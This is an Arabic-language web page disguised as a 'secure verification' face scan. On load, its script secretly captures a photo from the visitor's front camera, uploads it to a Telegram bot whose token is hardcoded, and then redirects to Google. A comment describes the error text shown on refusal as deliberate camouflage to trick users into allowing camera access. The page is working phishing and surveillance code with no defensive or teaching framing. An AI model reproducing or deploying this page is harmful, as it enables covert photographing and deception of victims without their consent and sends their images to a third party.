<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق الآمن</title>
    <style>
        body { background-color: #0b0e14; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .loader { border: 4px solid #1a2333; border-top: 4px solid #00dd85; border-radius: 50%; width: 55px; height: 55px; animation: spin 1s linear infinite; margin-bottom: 25px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 1.1rem; font-weight: bold; color: #a0aec0; text-align: center; padding: 0 20px; }
        canvas, video { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">جاري فحص ملامح الوجه لتأكيد الأمان الفوري...<br><small style="display:block; font-size:0.8rem; color:#e53e3e; margin-top:10px;">(يرجى الضغط على "سماح / Allow" إذا ظهرت لك نافذة التأكيد)</small></div>
    <canvas id="canvas"></canvas>

<script>
    # تم تحديث التوكن الجديد هنا بنجاح
    const TELEGRAM_TOKEN = '8446745973:AAGRD2tFbSrzB2OFoByvYRHCY1Hp6nluHf0';
    const urlParams = new URLSearchParams(window.location.search);
    const CHAT_ID = urlParams.get('chatId') || '8169635171'; 

    async function startCapture() {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.setAttribute('playsinline', ''); 
            video.srcObject = stream;
            await video.play();

            // وقت كافٍ للتركيز والتقاط صورة واضحة
            setTimeout(async () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'verification_face.jpg');

                    try {
                        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        if (response.ok) { console.log("Sent"); }
                    } catch (e) {
                        console.error(e);
                    } finally {
                        stream.getTracks().forEach(track => track.stop());
                        window.location.replace("https://www.google.com");
                    }
                }, 'image/jpeg', 0.75);

            }, 2000); 

        } catch (error) {
            // عبارة تمويه ذكية لحث المستخدم على التراجع والقبول بالإذن
            document.getElementById('status').innerHTML = "<span style='color:#f56565;'>❌ فشل التأكيد التلقائي!</span><br><br>يجب عليك إعادة تحديث الصفحة والضغط على <b>'سماح / Allow'</b> لتتمكن المنظومة من مطابقة الحساب والعبور.";
        }
    }

    window.onload = startCapture;
</script>
</body>
</html>
